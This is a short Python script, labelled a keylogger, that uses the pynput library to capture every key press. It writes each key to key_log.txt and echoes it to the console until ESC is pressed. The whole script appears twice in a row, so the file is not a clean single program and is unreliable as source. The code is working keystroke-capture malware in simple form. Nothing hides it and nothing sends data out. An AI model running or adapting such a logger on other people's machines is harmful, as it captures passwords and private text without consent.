from pynput import keyboard

def log_key(key):
    """Logs the key to a file and prints it to the console."""
    try:
        with open("key_log.txt", "a") as log_file:
            # Log alphanumeric and printable characters
            log_file.write(key.char)
            print(key.char, end="", flush=True)  # Print the character to the console
    except AttributeError:
        # Log and print special keys (e.g., Enter, Space, Backspace)
        key_str = f"[{key}]"
        with open("key_log.txt", "a") as log_file:
            log_file.write(key_str)
        print(key_str, end="", flush=True)

def on_press(key):
    """Callback for when a key is pressed."""
    log_key(key)

def on_release(key):
    """Callback for when a key is released."""
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    print("Keylogger is running. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
from pynput import keyboard

def log_key(key):
    """Logs the key to a file and prints it to the console."""
    try:
        with open("key_log.txt", "a") as log_file:
            # Log alphanumeric and printable characters
            log_file.write(key.char)
            print(key.char, end="", flush=True)  # Print the character to the console
    except AttributeError:
        # Log and print special keys (e.g., Enter, Space, Backspace)
        key_str = f"[{key}]"
        with open("key_log.txt", "a") as log_file:
            log_file.write(key_str)
        print(key_str, end="", flush=True)

def on_press(key):
    """Callback for when a key is pressed."""
    log_key(key)

def on_release(key):
    """Callback for when a key is released."""
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def main():
    print("Keylogger is running. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
